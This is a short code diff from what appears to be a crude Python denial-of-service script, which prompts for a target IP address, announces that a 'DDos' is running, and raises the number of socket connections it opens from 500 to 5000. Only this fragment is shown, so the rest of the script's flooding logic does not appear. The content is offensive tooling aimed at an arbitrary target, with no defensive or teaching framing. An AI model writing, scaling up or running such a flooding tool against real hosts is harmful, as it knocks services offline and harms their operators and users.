@@ -15,7 +15,7 @@ R = "\033[31m"    # Red
 import socket
 print("")
 ip=input("ENTER YOUR TARGET or YOUR IP : ");print ("DDos in your target is raning",ip)
-for h in range(500):
+for h in range(5000):
   try:
       knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)	
       socket.setdefaulttimeout(1)
